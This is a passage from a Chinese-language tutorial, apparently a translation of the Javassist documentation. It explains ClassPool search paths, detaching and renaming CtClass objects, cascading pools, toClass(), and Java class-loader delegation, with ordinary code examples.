的默认值是 false。</p><p>要禁止修剪一个特定的CtClass，必须事先对该对象调用stopPruning(true)。</p><p>在调试时，你可能想暂时停止修剪和冻结，并将修改后的类文件写入磁盘驱动器。debugWriteFile()是一个方便的方法。它停止修剪，写入一个类文件，将其解冻，并再次开启修剪（如果最初是开启的）。</p><h3 id="类搜索路径"><a href="#类搜索路径" class="headerlink" title="类搜索路径"></a>类搜索路径</h3><p>默认的<code>ClassPool.getDefault()</code>检索路径和JVM底层路径一致（classpath）。<strong><em>如果一个程序运行在一个web应用程序比如JBoss、Tomcat中，<code>ClassPool</code>对象则可能搜索不到用户的类</em></strong>，因为这样的Web应用服务器使用多个类加载器以及系统类加载器。==在这种情况下，一个额外的classpath必须注册到<code>ClassPool</code>中==。假设pool引用了一个ClassPool对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加class查找路径search path</span></span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(<span class="keyword">this</span>.getClass()));</span><br></pre></td></tr></table></figure><p>这个语句注册了用于加载这个对象类的类路径。你可以使用任何Class对象作为参数来代替this.getClass()。<code>Class</code>对象已经被注册上了的表现就是它所在的class path被加载了。</p><p>你也可以注册一个目录的名称作为一个class查找路径。例如，以下代码添加了<code>/usr/local/javalib</code>到class查找路径中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加文件目录作为class查找路径</span></span><br><span class="line">pool.insertClassPath(<span class="string">"/usr/local/javalib"</span>);</span><br></pre></td></tr></table></figure><p>还可以添加URL作为class查找路径：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加URL作为class查找路径，第三个参数必须/开头、第四个参数必须.结尾</span></span><br><span class="line"><span class="comment">// 添加 "http://www.javassist.org:80/java/"</span></span><br><span class="line">ClassPath cp = <span class="keyword">new</span> URLClassPath(<span class="string">"www.javassist.org"</span>, <span class="number">80</span>, <span class="string">"/java/"</span>, <span class="string">"org.javassist."</span>);</span><br><span class="line">pool.insertClassPath(cp);</span><br></pre></td></tr></table></figure><p>上面操作添加了<code>http://www.javassist.org:80/java/</code>到class查找路径中。这个URL仅仅用来查找<code>org.javassist.</code>包的类。</p><p>例如：加载一个<code>org.javassist.test.Main</code>类，它的class文件是： <code>http://www.javassist.org:80/java/org/javassist/test/Main.class</code> </p><p>此外，你还可以直接给一个byte数组去构建一个<code>CtClass</code>对象，可以使用<code>ByteArrayClassPath</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// byte数组形式class path</span></span><br><span class="line">ClassPool pool2 = ClassPool.getDefault();</span><br><span class="line"><span class="keyword">byte</span>[] arr = <span class="string">"org.byron4j"</span>.getBytes();</span><br><span class="line">String name = <span class="string">"org.byron4j.Hello"</span>;</span><br><span class="line">pool2.insertClassPath(<span class="keyword">new</span> ByteArrayClassPath(name, arr));</span><br><span class="line">CtClass ctClass = pool2.get(name);</span><br></pre></td></tr></table></figure><p><code>CtClass</code>对象ctClass表示字节数组b指定的class文件定义的类实例。<code>ClassPool</code>从给定的<code>ByteArrayClassPath</code>读取一个class文件。</p><p>如果调用get()并且给get()的类名等于name指定的类名，则ClassPool从给定的ByteArrayClassPath中读取类文件。</p><p>如果你不确定类的完全限定名，你可以使用<code>ClassPool</code>的<code>makeClass</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// makeClass</span></span><br><span class="line">ClassPool pool3 = ClassPool.getDefault();</span><br><span class="line">InputStream ins = <span class="keyword">new</span> FileInputStream(<span class="string">"/usr/local/javalib"</span>);</span><br><span class="line">CtClass ctClass1 = pool3.makeClass(ins);</span><br></pre></td></tr></table></figure><p>这里，makeClass() 返回从给定的输入流构建的 CtClass 对象。</p><p>你可以使用makeClass()将类文件急切地送入ClassPool对象。如果搜索路径包含一个大的jar文件，这可以提高性能。由于ClassPool对象按需读取类文件，它可能会重复搜索整个jar文件中的每一个类文件，makeClass()可以用来优化这种搜索。makeClass()构造的CtClass会被保存在ClassPool对象中，并且永远不会再读取类文件。</p><p>用户可以扩展class查找路径。可以定义一个实现<code>ClassPath</code>接口的新类，并将该类的一个实例交给ClassPool中的insertClassPath()。这种方式可以允许将非标准资源包含到class查找路径中。</p><h2 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h2><p>一个ClassPool对象是CtClass对象的容器。一旦一个CtClass对象被创建，它将永远记录在ClassPool中。这是因为编译器在以后编译引用该CtClass所代表的类的源代码时，可能需要访问该CtClass对象。</p><p>例如，假设一个新的方法getter()被添加到代表Point类的CtClass对象中。之后，程序试图编译包括Point中对getter()的方法调用的源代码，并将编译后的代码作为方法的主体，将其添加到另一个类Line中。如果丢失了代表Point的CtClass对象，编译器就无法编译对getter()的方法调用。请注意，原来的类定义并不包括getter()。因此，为了正确地编译这样的方法调用，ClassPool必须在程序执行的所有时间都包含CtClass的所有实例。</p><h3 id="避免内存不足"><a href="#避免内存不足" class="headerlink" title="避免内存不足"></a>避免内存不足</h3><p>如果CtClass对象的数量变得大得惊人，ClassPool的这种规范可能会造成巨大的内存消耗（这种情况很少发生，因为Javassist试图通过各种方式减少内存消耗：冻结calss等方式）。为了避免这个问题，你可以明确地从ClassPool中删除一个不必要的CtClass对象。如果你在一个CtClass对象上调用detach()，那么这个CtClass对象就会从ClassPool中删除。例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = classPool.get(<span class="string">"org.byron4j.cookbook.javaagent.Javassist2ClassPool"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用该方法后，会将CtClass对象从ClassPool中移除</span></span><br><span class="line">cc.writeFile();</span><br><span class="line">cc.detach();</span><br></pre></td></tr></table></figure><p>在detach()被调用后，你不能调用该CtClass对象上的任何方法。但是，你可以在ClassPool上调用get()来制作一个新的代表同一个类的CtClass实例。如果你调用get()，ClassPool会再次读取一个类文件，并新创建一个CtClass对象，这个对象由get()返回。</p><p>另一个想法是偶尔用新的ClassPool替换一个ClassPool，并丢弃旧的ClassPool。如果一个旧的ClassPool被垃圾回收，那么该ClassPool中包含的CtClass对象也会被垃圾回收。要创建一个新的ClassPool实例，请执行以下代码片段:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ClassPool cp = <span class="keyword">new</span> ClassPool(<span class="keyword">true</span>)<span class="comment">//简单粗暴</span></span><br><span class="line"><span class="comment">// if needed, append an extra search path by appendClassPath()</span></span><br></pre></td></tr></table></figure><p>这将创建一个ClassPool对象，它的行为就像ClassPool.getDefault()返回的默认ClassPool一样，getDefault()只是一个方便的方法。</p><p>注意，new ClassPool(true)是一个方便的构造函数，它可以构造一个ClassPool对象，并将系统搜索路径附加到它上面。调用该构造函数相当于下面的代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ClassPool cp = <span class="keyword">new</span> ClassPool();</span><br><span class="line">cp.appendSystemPath();  <span class="comment">// or append another path by appendClassPath()</span></span><br></pre></td></tr></table></figure><h3 id="级联ClassPool"><a href="#级联ClassPool" class="headerlink" title="级联ClassPool"></a>级联ClassPool</h3><p>如果程序运行在Web应用服务器上，是需要创建ClassPool的多个实例；应该为每个类加载器（容器）创建一个ClassPool的实例。==程序应该通过不调用getDefault()而调用ClassPool的构造函数来创建ClassPool对象==。</p><p>多个ClassPool对象可以像java.lang.ClassLoader一样级联。比如说 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 级联ClassPool</span></span><br><span class="line">ClassPool parent = ClassPool.getDefault();</span><br><span class="line">ClassPool child = <span class="keyword">new</span> ClassPool(parent);</span><br><span class="line">child.insertClassPath(<span class="string">"./classes"</span>);</span><br></pre></td></tr></table></figure><p>如果调用了child.get()，子ClassPool首先委托给父ClassPool。如果父ClassPool未能找到一个类文件，那么子ClassPool会尝试在./classes目录下找到一个类文件。</p><p>如果child.childFirstLookup为true，则子ClassPool在委托给父ClassPool之前，会尝试查找类文件。例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// child classpool在委托之前加载类文件</span></span><br><span class="line">ClassPool parent2 = ClassPool.getDefault();</span><br><span class="line">ClassPool child2 = <span class="keyword">new</span> ClassPool(parent2);</span><br><span class="line">child2.appendSystemPath();         <span class="comment">// 和默认同样的class查找路径</span></span><br><span class="line">child2.childFirstLookup = <span class="keyword">true</span>;    <span class="comment">// 改变child的行为</span></span><br></pre></td></tr></table></figure><h3 id="改变类名来定义新类"><a href="#改变类名来定义新类" class="headerlink" title="改变类名来定义新类"></a>改变类名来定义新类</h3><p>一个新的class可以被定义为一个已存在的类的副本。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool3 = ClassPool.getDefault();</span><br><span class="line">CtClass cc3 = pool3.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">cc3.setName(<span class="string">"Pair"</span>);</span><br></pre></td></tr></table></figure><p>这个程序首先包含类Point的CtClass对象，然后调用<code>setName()</code>方法为CtClass对象设置新的名称。</p><p>在这个调用之后，该CtClass对象所代表的类定义中所有出现的类名都由Point改为Pair。类定义的其他部分不会改变。</p><p>注意，CtClass中的setName()会改变ClassPool对象中的一条记录。从实现的角度来看，ClassPool对象是一个CtClass对象的哈希表，setName()改变了哈希表中与CtClass对象相关联的key。该键由原来的类名改为新的类名。</p><p>因此，如果以后再次调用ClassPool对象的get(“Point”)，那么它再也不会返回变量cc3所指的CtClass对象。ClassPool对象又读取了一个类文件Point.class，它为类Point构造了一个新的CtClass对象。这是因为与名称Point相关联的CtClass对象已经不存在了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = pool.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">CtClass cc1 = pool.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">cc.setName(<span class="string">"Pair"</span>);</span><br><span class="line">CtClass cc2 = pool.get(<span class="string">"Pair"</span>);</span><br><span class="line">CtClass cc3 = pool.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">System.out.println(cc == cc2);  <span class="comment">// true;</span></span><br><span class="line">System.out.println(cc3 == cc2); <span class="comment">// false;</span></span><br></pre></td></tr></table></figure><p>cc1和cc2指的是和cc一样的CtClass实例，而cc3没有。请注意，在执行cc.setName(“Pair”)后，cc和cc1引用的CtClass对象代表Pair类，所以cc2是去寻找Pair类而cc3还是去寻找Point类。</p><p><code>ClassPool</code> 对象用于维护类和CtClass的一对一映射关系。javassist不允许两个不一样的CtClass表示同一个class，除非是两个独立的ClassPool创建的。</p><p>为了创建一个默认ClassPool实例(Clas.getDefault()返回的)的一个副本，可以使用以下代码片段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassPool cp = <span class="keyword">new</span> ClassPool(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><p>这样一来，你拥有了两个ClassPool对象，可以从每一个ClassPool提供不同的CtClass对象表示同一个类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool10 = ClassPool.getDefault();</span><br><span class="line">CtClass ctClass10 = pool10.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">ClassPool pool20 = <span class="keyword">new</span> ClassPool(<span class="keyword">true</span>);</span><br><span class="line">CtClass ctClass20 = pool20.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">System.out.println(pool10 == pool20);   <span class="comment">// false 不同的ClassPool中表示同一个类的CtClass对象</span></span><br></pre></td></tr></table></figure><h3 id="通过重命名一个冻结的CtClass来创建一个新的CtClass对象"><a href="#通过重命名一个冻结的CtClass来创建一个新的CtClass对象" class="headerlink" title="通过重命名一个冻结的CtClass来创建一个新的CtClass对象"></a>通过重命名一个冻结的CtClass来创建一个新的CtClass对象</h3><p>一旦一个CtClass对象已经被writeFile()或者toBytecode()方法转到class文件，Javassist拒绝进一步修改该CtClass对象。因此，如果代表Point类的CtClass对象冻结后不能通过setName()修改它的名称。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = pool.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">cc.writeFile();<span class="comment">// 被冻结</span></span><br><span class="line">cc.setName(<span class="string">"Pair"</span>);<span class="comment">// 错误</span></span><br></pre></td></tr></table></figure><p>为了打破这个约束，可以使用ClassPool的<code>getAndRename()</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool30 = ClassPool.getDefault();</span><br><span class="line">CtClass ctClass30 = pool30.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">ctClass30.writeFile();<span class="comment">// 被冻结</span></span><br><span class="line"><span class="comment">//ctClass30.setName("Pair");// 冻结后不能使用--错误</span></span><br><span class="line">pool30.getAndRename(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>, <span class="string">"Pair"</span>);</span><br></pre></td></tr></table></figure><p>这是因为，如果调用getAndRename()，ClassPool首先读取Point.class来创建一个新的代表Point类的CtClass对象。然而，它在将该CtClass对象记录在哈希表中之前，会将该CtClass对象从Point重命名为Pair。因此，getAndRename()可以在调用代表Point类的CtClass对象的writeFile()或toBytecode()之后执行。 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> CtClass <span class="title">getAndRename</span><span class="params">(String orgName, String newName)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> NotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取一个新的CtClass对象</span></span><br><span class="line">    CtClass clazz = get0(orgName, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NotFoundException(orgName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz <span class="keyword">instanceof</span> CtClassType)</span><br><span class="line">        ((CtClassType)clazz).setClassPool(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置新的名称</span></span><br><span class="line">    clazz.setName(newName);         <span class="comment">// indirectly calls</span></span><br><span class="line">                                    <span class="comment">// classNameChanged() in this class</span></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ClassLoader-类加载"><a href="#ClassLoader-类加载" class="headerlink" title="ClassLoader 类加载"></a>ClassLoader 类加载</h2><p>如果事先知道必须修改什么类，那么修改类的最简单方法如下。</p><ol><li>通过调用ClassPool.get()获得一个CtClass对象。</li><li>修改它</li><li>在该CtClass对象上调用writeFile()或toBytecode()来获取修改后的类文件。</li></ol><p>如果一个类是否被修改是在加载时确定的，用户必须使Javassist与一个类加载器协作。Javassist可以与类加载器配合使用，这样就可以在加载时修改字节码。Javassist的用户可以定义自己版本的类加载器，但也可以使用Javassist提供的类加载器。</p><h3 id="CtClass的toClass-方法"><a href="#CtClass的toClass-方法" class="headerlink" title="CtClass的toClass()方法"></a>CtClass的toClass()方法</h3><p>CtClass提供了一个方便的方法toClass()，它请求当前线程的上下文类加载器加载CtClass对象所代表的类。要调用这个方法，调用者必须有相应的权限，否则，可能会抛出一个SecurityException。</p><p>下面的程序显示了如何使用toClass()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool cp = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = cp.get(<span class="string">"Hello"</span>);</span><br><span class="line">        CtMethod m = cc.getDeclaredMethod(<span class="string">"say"</span>);</span><br><span class="line">        m.insertBefore(<span class="string">"&#123; System.out.println(\"Hello.say():\"); &#125;"</span>);</span><br><span class="line">        Class c = cc.toClass();</span><br><span class="line">        Hello h = (Hello)c.newInstance();</span><br><span class="line">        h.say();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test.main()在Hello的say()的方法体中插入了对println()的调用。然后构造一个修改后的Hello类的实例，并在该实例上调用say()。</p><p>注意，==上面的程序取决于在调用toClass()之前，Hello类从未被加载==。如果不是这样，JVM就会在toClass()请求加载修改后的Hello类之前加载原来的Hello类。因此，加载修改后的Hello类会失败（会抛出LinkageError）。例如，如果Test中的main()是这样的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Hello orig = <span class="keyword">new</span> Hello();</span><br><span class="line">    ClassPool cp = ClassPool.getDefault();</span><br><span class="line">    CtClass cc = cp.get(<span class="string">"Hello"</span>);</span><br><span class="line">        :</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么原来的Hello类在main的第一行就被加载了，而调用toClass()会抛出一个异常，因为==类加载器不能同时加载两个不同版本的Hello类==。</p><p><strong><em>如果程序运行在web容器中例如JBoss、Tomcat中，</em></strong> 上下文的类加载器使用<code>toClass()</code>方法可能并不适当。在这种情况下，你可能会看到一个不期望的异常<code>ClassCastException</code>。为了避免这种情况，你==必须明白清楚地给定一个适当的类加载器给<code>toClass</code>方法==。例如，如果<code>bean</code>是你的会话的bean对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CtClass cc = ...</span><br><span class="line">Class c = cc.toClass(bean.getClass().getClassLoader());</span><br></pre></td></tr></table></figure><p>提供toClass()是为了方便。如果你需要更复杂的功能，你应该编写自己的类加载器。</p><h3 id="Java中的类加载"><a href="#Java中的类加载" class="headerlink" title="Java中的类加载"></a>Java中的类加载</h3><p>在Java中，多个类加载器可以共存，每个类加载器创建自己的命名空间。不同的类加载器可以加载具有相同类名的不同class文件，加载的两个类视为不同的类，这一个特性保证我们可以在一个JVM中运行多个应用程序即使这些程序包含相同类名的不同类实例。</p><p><strong>注意:</strong></p><p>==JVM不允许动态的重新加载一个类。一旦某个类加载器加载了某个类后，它就不能在运行时再重新加载一个新版本的类了。==</p><p>因此，你==不能在JVM加载类后，再去变更类的定义。==</p><p>但是，JPDA（Java平台调试架构）提供了有限的类重加载能力。</p><p>如果相同的class文件被不同的类加载器加载了，==JVM会使用相同的名称和定义创建两个不同的类==，这两个类会被看做是不同的。既然这两个类是不同的，所以一个类的实例就不能分配给另一个类类型的变量了。两个类之间的转码操作失败，并抛出一个ClassCastException。</p><p>例如，下面的代码片段就会抛出一个ClassCastException异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MyClassLoader myLoader = <span class="keyword">new</span> MyClassLoader();</span><br><span class="line">Class clazz = myLoader.loadClass(<span class="string">"Box"</span>);</span><br><span class="line">Object obj = clazz.newInstance();</span><br><span class="line">Box b = (Box)obj;<span class="comment">// this always throws ClassCastException.</span></span><br></pre></td></tr></table></figure><p>Box类是由两个类加载器加载的。假设一个类加载器CL加载一个包括这个代码片段的类。由于这个代码片段引用了MyClassLoader、Class、Object和Box，CL也会加载这些类（除非它委托给另一个类加载器）。因此，变量b的类型就是CL加载的Box类。另一方面，myLoader也加载Box类。对象obj是myLoader加载的Box类的一个实例。因此，最后一条语句总是抛出一个ClassCastException，因为obj的类与作为变量b类型的Box类的不同版本。</p><p><strong>多个类加载器形成一个树结构</strong>:</p><p>每个类加载器（引导加载器BootstrapClassLoader除外）都有一个父的类加载器（通常是加载了该子类加载器的类）。类加载请求可以沿着这个类加载器层级委托，一个类可能会被不是你请求的类加载器去加载。因此，被请求去加载一个类C的类加载器和实际加载这个类C的加载器可能不是同一个类加载器。以示区别，我们将前面的加载器称为<strong><em>C的启动器</em></strong>，后面的称为<strong><em>C的真实加载器</em></strong>。</p><p>此外，如果请求加载类C的类加载器CL（C的发起者）委托给父类加载器PL，之后，类加载器CL则再也不会被请求去加载类C定义中引用的任何类。CL不是类C的引用的类的启动器，相反，PL成为了类C的引用的类的启动器，并且PL将会被请求去加载它们。<strong>类C的定义所引用的类是由C的真正的加载器加载</strong>。</p><p>再看一个有些细微差异的示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;    <span class="comment">// 被PL加载</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> x, y;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getX</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> x; &#125;</span><br><span class="line">        :</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Box</span> </span>&#123;      <span class="comment">// 引导器是CL，但是真实加载器是PL</span></span><br><span class="line">    <span class="keyword">private</span> Point upperLeft, size;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getBaseX</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> upperLeft.x; &#125;</span><br><span class="line">        :</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Window</span> </span>&#123;    <span class="comment">// 被CL加载</span></span><br><span class="line">    <span class="keyword">private</span> Box box;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getBaseX</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> box.getBaseX(); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设一个类<code>Window</code>被一个类加载器CL加载了，则它的引导器和真实加载器都是CL。因为Window的定义引用了Box，所以JVM会请求CL加载Box。这里，假设CL将这个任务委托给父类加载器PL。加载Box的发起者是CL，但真正的加载器是PL。在这种情况下，Point的发起者不是CL，而是PL，因为它与Box的真正加载器相同。因此，CL永远不会被请求加载Point。</p><p>接下来，让我们考虑一个稍加修改的例子。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> x, y;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getX</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> x; &#125;</span><br><span class="line">        :</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Box</span> </span>&#123;      <span class="comment">// 引导器是CL，但是真实加载器是PL</span></span><br><span class="line">    <span class="keyword">private</span> Point upperLeft, size;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Point <span class="title">getSize</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> size; &#125;</span><br><span class="line">        :</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Window</span> </span>&#123;    <span class="comment">// 被CL加载</span></span><br><span class="line">    <span class="keyword">private</span> Box box;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">widthIs</span><span class="params">(<span class="keyword">int</span> w)</span> </span>&#123;</span><br><span class="line">        Point p = box.getSize();</span><br><span class="line">        <span class="keyword">return</span> w == p.getX();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在<code>Window</code>类的定义也引用了<code>Point</code>类，在这个案例中，CL在被请求加载<code>Point</code>时也将委托给PL。<strong><em>你必须避免存在两个不同的类加载器重复加载同一个类</em></strong>，二者中的其中一个必须委托给另外一个。 如果在<code>Point</code>加载的时候，CL没有委托给PL，<code>widthIs()</code>将会抛出一个<code>ClassCastException</code>。因为<code>Box</code>的真实加载器是PL，<code>Box</code>中引用的类<code>Point</code>类也会被PL加载。因此，<code>getSize()</code>方法返回值是PL加载的<code>Point</code>的一个实例，然而<code>getSize()</code>方法中的变量是CL加载的<code>Point</code>类型，JVM将它们视作不同的类型，所以会抛出类型不匹配的异常。</p><p>这种行为有些不方便但却是必要的,如果<code>Point p = box.getSize();</code>不会抛出异常，则<code>Window</code>的程序员就打破了<code>Point</code>类的封装性。例如，在PL加载的Point中，字段x是私有的。但是，如果CL用下面的定义加载Point(public代替private)，Window类则可以直接访问x的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> x, y;    <span class="comment">// not private</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getX</span><span class="params">()</span> </span>&#123; <span 